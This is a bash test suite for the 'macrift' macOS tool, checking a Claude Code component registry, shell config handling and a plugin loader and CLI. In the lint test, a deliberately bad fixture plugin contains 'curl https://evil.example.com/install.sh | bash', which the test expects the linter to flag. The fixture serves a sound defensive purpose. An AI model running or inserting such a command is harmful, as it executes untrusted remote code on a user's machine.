#!/usr/bin/env bash
# macrift test suite — plain bash, no external deps (no bats/shfmt needed).
# Run: bash tests/run.sh
#
# Focus: lock the Claude Code component registry so the menu/wizard derived
# from it can never silently drift from the intended set (the casing bug that
# started this work lived in the old hand-synced parallel arrays).

set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
export MACRIFT_DIR="$ROOT"
: "${HOME:=/tmp}"

pass=0 fail=0
ok() {
  pass=$((pass + 1))
  printf '  ok   %s\n' "$1"
}
no() {
  fail=$((fail + 1))
  printf '  FAIL %s\n' "$1"
  [[ -n "${2:-}" ]] && printf '         %s\n' "$2"
}
eq() { # name actual expected
  if [[ "$2" == "$3" ]]; then ok "$1"; else no "$1" "expected [$3] got [$2]"; fi
}

# Function defs only — claude_code.sh has no top-level side effects.
# shellcheck disable=SC1091
source "$ROOT/customize/claude_code.sh"

rows="$(_cc_registry)"

printf '== registry integrity ==\n'
eq "13 component rows" "$(printf '%s\n' "$rows" | grep -c '|')" "13"

bad_fields=0
while IFS= read -r r; do
  [[ -z "$r" ]] && continue
  pipes="${r//[^|]/}"
  [[ ${#pipes} -eq 10 ]] || bad_fields=$((bad_fields + 1))
done <<<"$rows"
eq "every row has 11 fields" "$bad_fields" "0"

printf '== menu derivation (golden) ==\n'
# Golden values captured from the pre-registry _cc_custom_menu.
menu_keys="" menu_render="" bad_handler=0
prev=""
while IFS='|' read -r key section menu wiz mwait wdefault mlabel wlabel handler desc usecase; do
  [[ "$menu" == y ]] || continue
  [[ -n "$handler" ]] || bad_handler=$((bad_handler + 1))
  if [[ "$section" != "$prev" ]]; then
    menu_render+="## $section"$'\n'
    prev="$section"
  fi
  menu_render+="$mlabel"$'\n'
  menu_keys+="$key "
done <<<"$rows"
menu_keys="${menu_keys% }"

eq "menu keys + order" "$menu_keys" \
  "settings statusline agents commands rules hooks env claude_md ralias mcp"
eq "every menu row has a handler" "$bad_handler" "0"

read -r -d '' golden_menu_render <<'EOF'
## Core
Settings
Statusline
## AI extensions
Agents
Slash Commands
Rules
Hooks
## Shell integration
Environment (.zshrc env vars)
CLAUDE.md (rule imports)
'r' alias
## MCP servers
MCP Servers (context7, playwright)
EOF
eq "menu render (headers + labels)" "${menu_render%$'\n'}" "$golden_menu_render"

printf '== wizard derivation (golden) ==\n'
wiz_keys="" wiz_sections="" wiz_defaults=""
while IFS='|' read -r key section menu wiz mwait wdefault mlabel wlabel handler desc usecase; do
  [[ "$wiz" == y ]] || continue
  wiz_keys+="$key "
  wiz_sections+="$section|"
  wiz_defaults+="$wdefault"
done <<<"$rows"
wiz_keys="${wiz_keys% }"

eq "wizard keys + order" "$wiz_keys" \
  "settings statusline doctor agents commands rules hooks env claude_md ralias mcp_context7 mcp_playwright"
eq "wizard panel sections" "$wiz_sections" \
  "Core|Core|Core|AI extensions|AI extensions|AI extensions|AI extensions|Shell integration|Shell integration|Shell integration|MCP servers|MCP servers|"
eq "wizard defaults all yes" "$wiz_defaults" "yyyyyyyyyyyy"

printf '== _cc_wizard_label lookup ==\n'
eq "label: doctor" "$(_cc_wizard_label doctor)" "Doctor + /doctor command"
eq "label: mcp_context7" "$(_cc_wizard_label mcp_context7)" "MCP context7"
eq "label: settings" "$(_cc_wizard_label settings)" "Settings"

printf '== _cc_marker_balanced ==\n'
tmp="$(mktemp)"
printf '# M\nfoo\n# M\n' >"$tmp"
if _cc_marker_balanced "$tmp" "# M"; then ok "balanced pair → 0"; else no "balanced pair → 0"; fi
printf '# M\nfoo\n' >"$tmp"
if _cc_marker_balanced "$tmp" "# M"; then no "single marker → should be non-zero"; else ok "single marker → non-zero"; fi
rm -f "$tmp"

printf '== cross-shell resolver (_cc_target_rc / _cc_shell_kind) ==\n'
eq "zsh → .zshrc" "$(SHELL=/bin/zsh _cc_target_rc)" "$HOME/.zshrc"
eq "bash → .bashrc" "$(SHELL=/bin/bash _cc_target_rc)" "$HOME/.bashrc"
eq "fish → config.fish" "$(SHELL=/usr/local/bin/fish _cc_target_rc)" "$HOME/.config/fish/config.fish"
eq "unknown → zsh fallback" "$(SHELL=/bin/sh _cc_target_rc)" "$HOME/.zshrc"

printf '== export-line translation (_cc_export_line) ==\n'
eq "zsh keeps export" "$(_cc_export_line zsh 'export FOO=bar')" "export FOO=bar"
eq "bash keeps export" "$(_cc_export_line bash 'export FOO=bar')" "export FOO=bar"
eq "fish → set -gx" "$(_cc_export_line fish 'export FOO=bar')" "set -gx FOO bar"
eq "fish real var" "$(_cc_export_line fish 'export CLAUDE_CODE_SUBAGENT_MODEL=claude-sonnet-4-6')" \
  "set -gx CLAUDE_CODE_SUBAGENT_MODEL claude-sonnet-4-6"

printf '== _cc_effect_for (every wizard component has a system-effect line) ==\n'
missing_eff=0
while IFS='|' read -r key section menu wiz rest; do
  [[ "$wiz" == y ]] || continue
  [[ -n "$(_cc_effect_for "$key")" ]] || missing_eff=$((missing_eff + 1))
done < <(_cc_registry)
eq "all wizard keys have an effect" "$missing_eff" "0"
eq "effect: settings mentions merge+kept" \
  "$(_cc_effect_for settings | grep -c 'merged')" "1"

printf '== _cc_caveat_for ==\n'
eq "ralias caveat warns at default 'r'" "$(CC_RUN_ALIAS=r _cc_caveat_for ralias | grep -c shadows)" "1"
eq "ralias caveat silent when renamed" "$(CC_RUN_ALIAS=rr _cc_caveat_for ralias)" ""
eq "rules caveat present" "$([ -n "$(_cc_caveat_for rules)" ] && echo yes)" "yes"

# == plugin loader (plugins.sh) ==
# Hermetic unit tests — mock common.sh helpers so we don't drag in its set -e
# + log-file side effects. _macrift_version_gt copied verbatim from common.sh.
printf '== plugin loader (plugins.sh) ==\n'
# Stubs emit just the message text (no styling) — tests grep stdout/stderr for it.
log_warn() { printf '%s\n' "${1:-}" >&2; }
log_err()  { printf '%s\n' "${1:-}" >&2; }
log_info() { printf '%s\n' "${1:-}"; }
log_ok()   { printf '%s\n' "${1:-}"; }
log_hint() { printf '%s\n' "${1:-}"; }
# Stub confirm — auto-yes unless MACRIFT_TEST_DENY=true forces a no. Real
# confirm reads /dev/tty (unreliable / unavailable in test runners).
confirm() {
    [[ "${MACRIFT_TEST_DENY:-}" == "true" ]] && return 1
    return 0
}
# shellcheck disable=SC2034  # read by plugins.sh after source
MACRIFT_VERSION="26.05.3"
# shellcheck disable=SC2034  # read by plugins.sh after source
MACRIFT_OS_VER="14.0"
_macrift_version_gt() {
  [[ "$1" == "$2" ]] && return 1
  local IFS=. i x y
  # shellcheck disable=SC2206
  local -a a=($1) b=($2)
  for ((i = 0; i < ${#a[@]} || i < ${#b[@]}; i++)); do
    x=${a[i]:-0}; y=${b[i]:-0}
    x=${x//[^0-9]/}; y=${y//[^0-9]/}
    ((10#${x:-0} > 10#${y:-0})) && return 0
    ((10#${x:-0} < 10#${y:-0})) && return 1
  done
  return 1
}
# shellcheck disable=SC1091
source "$ROOT/plugins.sh"

PT="$(mktemp -d)"
trap 'rm -rf "$PT"' EXIT
# shellcheck disable=SC2034  # read by plugins.sh after source
MACRIFT_PLUGINS_DIR="$PT"

# Helper to (re)write a plugin manifest
write_manifest() {
  local dir="$1"; shift
  mkdir -p "$dir"
  cat > "$dir/plugin.json" <<<"$*"
}

eq "discover empty when no plugin dirs" "$(_plugin_discover | wc -l | tr -d ' ')" "0"

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"Alpha","function":"alpha_menu"}}'
write_manifest "$PT/beta"  '{"name":"beta","version":"0.1.0","description":"b","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"Beta","function":"beta_menu"}}'
mkdir -p "$PT/orphan"  # no plugin.json → should be skipped

eq "discover finds 2 plugins, skips orphan dir" "$(_plugin_discover | wc -l | tr -d ' ')" "2"
eq "field .name reads correctly"  "$(_plugin_field "$PT/alpha" .name)"  "alpha"
eq "field .compat.macrift_api"    "$(_plugin_field "$PT/alpha" .compat.macrift_api)" "1"
if _plugin_field "$PT/alpha" .nope >/dev/null 2>&1; then no "missing field returns 1"; else ok "missing field returns 1"; fi

if _plugin_compat_ok "$PT/alpha"; then ok "valid plugin passes compat"; else no "valid plugin passes compat"; fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":99},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects future API";    else ok "rejects future API";    fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":0},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects older API";     else ok "rejects older API";     fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":"abc"},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects non-integer API"; else ok "rejects non-integer API"; fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"99.99","macrift_api":1},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects too-new macrift_min"; else ok "rejects too-new macrift_min"; fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":1,"macos_min":"99.0"},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects too-new macos_min"; else ok "rejects too-new macos_min"; fi

write_manifest "$PT/alpha" '{"version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects missing .name"; else ok "rejects missing .name"; fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_api":1},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects missing compat.macrift_min"; else ok "rejects missing compat.macrift_min"; fi

# == macrift plugin CLI ==
printf '== macrift plugin CLI ==\n'

# Reset to two valid plugins for list-rendering tests
write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"alpha plugin","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
write_manifest "$PT/beta"  '{"name":"beta","version":"0.1.0","description":"beta plugin","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"T","entry":"B","function":"b_menu"}}'

# list — populated
out=$(_plugin_cli_list 2>&1)
echo "$out" | grep -q "NAME.*VERSION.*STATUS.*DESCRIPTION" && ok "list header has NAME/VERSION/STATUS/DESCRIPTION" || no "list header"
echo "$out" | grep -q "alpha"          && ok "list shows alpha"               || no "list shows alpha"
echo "$out" | grep -q "beta"           && ok "list shows beta"                || no "list shows beta"
echo "$out" | grep -q "alpha plugin"   && ok "list shows description"         || no "list shows description"
echo "$out" | grep -q "^  alpha .* ok " && ok "list marks compatible alpha as ok" || no "compat status missing"

# list — incompatible plugin shows as 'incompatible', not filtered out
write_manifest "$PT/future" '{"name":"future","version":"1.0.0","description":"f","compat":{"macrift_min":"26.05","macrift_api":99},"menu":{"section":"T","entry":"F","function":"f_menu"}}'
out=$(_plugin_cli_list 2>&1)
echo "$out" | grep -qE "^  future .* incompatible " && ok "incompatible plugin shown with status" || no "incompatible plugin missing status"
rm -rf "${PT:?}"/future

# list — empty
rm -rf "${PT:?}"/*
out=$(_plugin_cli_list 2>&1)
echo "$out" | grep -q "No plugins installed" && ok "empty list says No plugins installed" || no "empty list message"

# dispatcher: default arg is list
out=$(_plugin_cli 2>&1)
echo "$out" | grep -q "No plugins installed" && ok "bare _plugin_cli defaults to list" || no "bare _plugin_cli defaults to list"

# dispatcher: help
out=$(_plugin_cli help 2>&1)
echo "$out" | grep -q "Usage: macrift plugin" && ok "help renders usage" || no "help renders usage"

# dispatcher: unknown subcommand
if _plugin_cli no-such 2>/dev/null; then no "unknown subcommand returns 1"; else ok "unknown subcommand returns 1"; fi

# == _plugin_load_all (auto-source + registry) ==
printf '== _plugin_load_all ==\n'

# Empty registry on a fresh dir
rm -rf "${PT:?}"/*
_plugin_load_all
eq "empty plugins dir → empty registry" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# One valid plugin → registry populated, function sourced
mkdir -p "$PT/alpha"
cat > "$PT/alpha/plugin.json" <<'JSON'
{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"Alpha","function":"alpha_menu"}}
JSON
cat > "$PT/alpha/menu.sh" <<'SH'
alpha_menu() { echo "alpha called"; }
SH

_plugin_load_all
eq "valid plugin: registry size"   "${#MACRIFT_PLUGIN_REGISTRY[@]}" "1"
eq "valid plugin: registry value"  "${MACRIFT_PLUGIN_REGISTRY[0]}"  $'Test\tAlpha\talpha_menu'
if declare -F alpha_menu >/dev/null; then ok "valid plugin: menu.sh sourced"; else no "valid plugin: menu.sh sourced"; fi

# Incompatible plugin → skipped
mkdir -p "$PT/future"
cat > "$PT/future/plugin.json" <<'JSON'
{"name":"future","version":"1.0.0","description":"f","compat":{"macrift_min":"26.05","macrift_api":99},"menu":{"section":"Test","entry":"Future","function":"future_menu"}}
JSON
cat > "$PT/future/menu.sh" <<'SH'
future_menu() { :; }
SH

_plugin_load_all
# Registry should still be 1 (alpha only); 'future' filtered out
eq "incompatible plugin skipped (registry stays at 1)" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "1"

# Missing menu.sh → skipped
rm -rf "${PT:?}"/*
mkdir -p "$PT/nomenu"
cat > "$PT/nomenu/plugin.json" <<'JSON'
{"name":"nomenu","version":"1.0.0","description":"n","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"N","function":"nomenu_menu"}}
JSON
# (no menu.sh)
_plugin_load_all
eq "missing menu.sh: plugin skipped" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# menu.sh present but doesn't define the declared function → skipped
rm -rf "${PT:?}"/*
mkdir -p "$PT/badfn"
cat > "$PT/badfn/plugin.json" <<'JSON'
{"name":"badfn","version":"1.0.0","description":"b","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"BadFn","function":"declared_but_missing"}}
JSON
cat > "$PT/badfn/menu.sh" <<'SH'
some_other_function() { :; }
SH
_plugin_load_all
eq "menu.sh missing declared function: plugin skipped" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# Two plugins, same section — both in registry (grouping is render-time)
rm -rf "${PT:?}"/*
mkdir -p "$PT/p1" "$PT/p2"
cat > "$PT/p1/plugin.json" <<'JSON'
{"name":"p1","version":"1.0.0","description":"","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Same","entry":"P1","function":"p1_menu"}}
JSON
cat > "$PT/p1/menu.sh" <<'SH'
p1_menu() { :; }
SH
cat > "$PT/p2/plugin.json" <<'JSON'
{"name":"p2","version":"1.0.0","description":"","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Same","entry":"P2","function":"p2_menu"}}
JSON
cat > "$PT/p2/menu.sh" <<'SH'
p2_menu() { :; }
SH
_plugin_load_all
eq "two plugins in same section: both registered" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "2"

# Idempotent re-load — calling twice should give same final state, not double
_plugin_load_all
eq "idempotent reload (no doubling)" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "2"


# == wallpaper-links sample plugin (end-to-end against the real vendor tree) ==
# The minimal-viable plugin — single show_menu + open. Used as the template
# example in PLUGINS.md / README.
if [[ -d "$ROOT/vendor/wallpaper-links" ]]; then
    printf '== wallpaper-links (vendor/) ==\n'
    if jq . "$ROOT/vendor/wallpaper-links/plugin.json" >/dev/null 2>&1; then
        ok "wallpaper-links plugin.json valid"
    else
        no "wallpaper-links plugin.json valid"
    fi
    SBX2="$(mktemp -d)"
    ln -sf "$ROOT/vendor/wallpaper-links" "$SBX2/wallpaper-links"
    saved_dir2="$MACRIFT_PLUGINS_DIR"
    MACRIFT_PLUGINS_DIR="$SBX2"
    _plugin_load_all 2>/dev/null
    eq "wallpaper-links registered" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "1"
    if declare -F wallpaper_links_menu >/dev/null; then
        ok "wallpaper_links_menu function defined"
    else
        no "wallpaper_links_menu function defined"
    fi
    eq "wallpaper-links section is Customize" \
       "$(IFS=$'\t'; read -r s _ _ <<<"${MACRIFT_PLUGIN_REGISTRY[0]}"; printf '%s' "$s")" \
       "Customize"
    rm -rf "$SBX2"
    MACRIFT_PLUGINS_DIR="$saved_dir2"
fi

# == multi-plugin scenario (both seed plugins load together) ==
if [[ -d "$ROOT/vendor/claudemac" && -d "$ROOT/vendor/wallpaper-links" ]]; then
    printf '== multi-plugin (vendor/ as plugins dir) ==\n'
    saved_dir3="$MACRIFT_PLUGINS_DIR"
    MACRIFT_PLUGINS_DIR="$ROOT/vendor"
    _plugin_load_all 2>/dev/null
    eq "both plugins register" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "2"
    # Order is filesystem-alphabetical: claudemac < wallpaper-links
    eq "first registered is claudemac" \
       "$(IFS=$'\t'; read -r _ _ f <<<"${MACRIFT_PLUGIN_REGISTRY[0]}"; printf '%s' "$f")" \
       "claudemac_menu"
    eq "second registered is wallpaper-links" \
       "$(IFS=$'\t'; read -r _ _ f <<<"${MACRIFT_PLUGIN_REGISTRY[1]}"; printf '%s' "$f")" \
       "wallpaper_links_menu"
    MACRIFT_PLUGINS_DIR="$saved_dir3"
fi

# == claudemac flagship plugin (end-to-end against the real vendor tree) ==
if [[ -d "$ROOT/vendor/claudemac" ]]; then
    printf '== claudemac (vendor/) ==\n'
    if jq . "$ROOT/vendor/claudemac/plugin.json" >/dev/null 2>&1; then
        ok "plugin.json is valid JSON"
    else
        no "plugin.json is valid JSON"
    fi
    eq "name kebab-case" \
       "$(jq -r .name "$ROOT/vendor/claudemac/plugin.json" | grep -cE '^[a-z][a-z0-9-]*[a-z0-9]$')" "1"
    eq "version is semver" \
       "$(jq -r .version "$ROOT/vendor/claudemac/plugin.json" | grep -cE '^[0-9]+\.[0-9]+\.[0-9]+')" "1"
    eq "menu.function names a valid bash identifier" \
       "$(jq -r .menu.function "$ROOT/vendor/claudemac/plugin.json" | grep -cE '^[a-zA-Z_][a-zA-Z0-9_]*$')" "1"

    # Real loader against vendor/claudemac under a sandbox plugins dir.
    SBX="$(mktemp -d)"
    ln -sf "$ROOT/vendor/claudemac" "$SBX/claudemac"
    saved_dir="$MACRIFT_PLUGINS_DIR"
    MACRIFT_PLUGINS_DIR="$SBX"
    _plugin_load_all 2>/dev/null  # silence path warnings from non-test envs
    eq "claudemac registered" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "1"
    if declare -F claudemac_menu >/dev/null; then
        ok "claudemac_menu function defined"
    else
        no "claudemac_menu function defined"
    fi
    if declare -F claude_code_menu >/dev/null; then
        ok "claude_code_menu (handler) defined"
    else
        no "claude_code_menu (handler) defined"
    fi
    if declare -F _cc_telegram_menu >/dev/null; then
        ok "_cc_telegram_menu (handler) defined"
    else
        no "_cc_telegram_menu (handler) defined"
    fi
    eq "CC_CONFIG resolves into the plugin tree" \
       "$(printf '%s' "$CC_CONFIG" | grep -c '/claudemac/config$')" "1"
    rm -rf "$SBX"
    MACRIFT_PLUGINS_DIR="$saved_dir"
fi


# == plugin add / remove / update / info / lint (end-to-end on a local git fixture) ==
if command -v git >/dev/null 2>&1; then
    printf '== plugin CLI (add/remove/update/info/lint) ==\n'

    # Build a local git repo from vendor/wallpaper-links so we can test the
    # add CLI without network.
    FX_REPO="$(mktemp -d)/wp-links"
    cp -R "$ROOT/vendor/wallpaper-links" "$FX_REPO"
    ( cd "$FX_REPO" \
      && git init -q \
      && git config user.email "test@local" \
      && git config user.name "test" \
      && git add -A \
      && git commit -q -m "init wallpaper-links 1.0.0" \
      && git tag v1.0.0 ) || no "fixture repo setup"

    # Sandbox $HOME-ish env for the CLI commands
    CLI_SBX="$(mktemp -d)"
    saved_pd="$MACRIFT_PLUGINS_DIR"
    saved_lk="${MACRIFT_PLUGINS_LOCK:-}"
    MACRIFT_PLUGINS_DIR="$CLI_SBX/plugins"
    MACRIFT_PLUGINS_LOCK="$CLI_SBX/plugins.lock.json"
    export MACRIFT_NO_CONFIRM=true

    # --- add (no @ref so HEAD stays on a tracking branch — needed for update tests) ---
    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1
    if [[ -d "$MACRIFT_PLUGINS_DIR/wallpaper-links" ]]; then
        ok "plugin add installs the plugin tree"
    else
        no "plugin add installs the plugin tree"
    fi
    eq "lockfile records the install"   "$(jq -r '.plugins | length' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" "1"
    eq "lockfile has source"            "$(jq -r '.plugins."wallpaper-links".source' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null | grep -c 'wp-links')" "1"
    eq "lockfile has commit"            "$(jq -r '.plugins."wallpaper-links".commit' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null | wc -c | tr -d ' ')" "41"  # 40 hex + newline

    # --- add again with denied confirm — must NOT overwrite the install ---
    pre_install_at=$(jq -r '.plugins."wallpaper-links".installed_at' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)
    MACRIFT_TEST_DENY=true
    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1 || true
    MACRIFT_TEST_DENY=""
    post_install_at=$(jq -r '.plugins."wallpaper-links".installed_at' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)
    eq "collision: declined confirm leaves install untouched" "$pre_install_at" "$post_install_at"

    # --- info ---
    info_out=$(_plugin_cli_info wallpaper-links 2>&1)
    echo "$info_out" | grep -q "wallpaper-links 1.0.0" && ok "info: name + version" || no "info: name + version"
    echo "$info_out" | grep -q "Status:    ok"          && ok "info: status ok"      || no "info: status ok"
    echo "$info_out" | grep -q "Source:"                && ok "info: source line"    || no "info: source line"
    echo "$info_out" | grep -q "Commit:"                && ok "info: commit line"    || no "info: commit line"

    if _plugin_cli_info no-such-plugin >/dev/null 2>&1; then
        no "info on nonexistent plugin should return 1"
    else
        ok "info on nonexistent plugin returns 1"
    fi

    # --- lint ---
    if _plugin_cli_lint wallpaper-links >/dev/null 2>&1; then
        ok "lint clean on a well-formed plugin"
    else
        no "lint clean on a well-formed plugin"
    fi

    # --- lint catches bad patterns ---
    BAD_DIR="$CLI_SBX/bad-plugin"
    mkdir -p "$BAD_DIR"
    cat > "$BAD_DIR/plugin.json" <<'JSON'
{"name":"bad","version":"1.0.0","description":"bad","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"B","function":"b_menu"}}
JSON
    cat > "$BAD_DIR/menu.sh" <<'SH'
b_menu() {
    defaults write com.test.bad TheKey -bool true
    curl https://evil.example.com/install.sh | bash
}
SH
    lint_out=$(_plugin_cli_lint "$BAD_DIR" 2>&1)
    echo "$lint_out" | grep -q "defaults write"    && ok "lint flags raw 'defaults write'"  || no "lint flags raw 'defaults write'"
    echo "$lint_out" | grep -q "curl"              && ok "lint flags 'curl | bash'"          || no "lint flags 'curl | bash'"

    # --- update (idempotent — nothing changed upstream) ---
    pre_head=$(git -C "$MACRIFT_PLUGINS_DIR/wallpaper-links" rev-parse HEAD 2>/dev/null || echo "?")
    _plugin_cli_update wallpaper-links >/dev/null 2>&1 && ok "update: idempotent returns 0" || no "update: idempotent returns 0"
    post_head=$(git -C "$MACRIFT_PLUGINS_DIR/wallpaper-links" rev-parse HEAD 2>/dev/null || echo "?")
    eq "update: idempotent leaves HEAD unchanged" "$pre_head" "$post_head"

    # --- update after upstream advances ---
    ( cd "$FX_REPO" \
      && echo "# extra" >> README.md \
      && git add README.md \
      && git commit -q -m "extra commit" ) || no "fixture upstream advance"
    pre_head=$(git -C "$MACRIFT_PLUGINS_DIR/wallpaper-links" rev-parse HEAD 2>/dev/null || echo "?")
    _plugin_cli_update wallpaper-links >/dev/null 2>&1 || true
    post_head=$(git -C "$MACRIFT_PLUGINS_DIR/wallpaper-links" rev-parse HEAD 2>/dev/null || echo "?")
    if [[ "$pre_head" != "$post_head" ]]; then ok "update pulls a new commit"; else no "update pulls a new commit"; fi

    # --- remove ---
    _plugin_cli_remove wallpaper-links >/dev/null 2>&1
    if [[ ! -e "$MACRIFT_PLUGINS_DIR/wallpaper-links" ]]; then
        ok "remove deletes the plugin tree"
    else
        no "remove deletes the plugin tree"
    fi
    eq "lockfile entry removed" "$(jq -r '.plugins | length' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" "0"

    if _plugin_cli_remove wallpaper-links >/dev/null 2>&1; then
        no "remove on missing plugin should fail"
    else
        ok "remove on missing plugin fails"
    fi

    # --- _plugin_normalize_source unit checks ---
    eq "normalize github.com/x/y"  "$(_plugin_normalize_source 'github.com/x/y')" "https://github.com/x/y"
    eq "normalize https URL"       "$(_plugin_normalize_source 'https://example.com/x.git')" "https://example.com/x.git"
    eq "normalize file://"         "$(_plugin_normalize_source 'file:///abs/path')" "file:///abs/path"
    eq "normalize ssh user@host"   "$(_plugin_normalize_source 'git@github.com:x/y.git')" "git@github.com:x/y.git"
    eq "normalize absolute path"   "$(_plugin_normalize_source '/abs/path')" "/abs/path"
    if _plugin_normalize_source 'random-garbage' >/dev/null 2>&1; then
        no "normalize rejects unknown form"
    else
        ok "normalize rejects unknown form"
    fi

    # --- @ref ref-handling (separate install — detached HEAD precludes 'update') ---
    _plugin_cli_add "file://$FX_REPO@v1.0.0" >/dev/null 2>&1
    eq "lockfile records ref when @ref given" \
       "$(jq -r '.plugins."wallpaper-links".ref' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" \
       "v1.0.0"
    _plugin_cli_remove wallpaper-links >/dev/null 2>&1

    # Cleanup
    rm -rf "$CLI_SBX" "$(dirname "$FX_REPO")"
    MACRIFT_PLUGINS_DIR="$saved_pd"
    MACRIFT_PLUGINS_LOCK="$saved_lk"
    unset MACRIFT_NO_CONFIRM
fi

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[[ $fail -eq 0 ]]
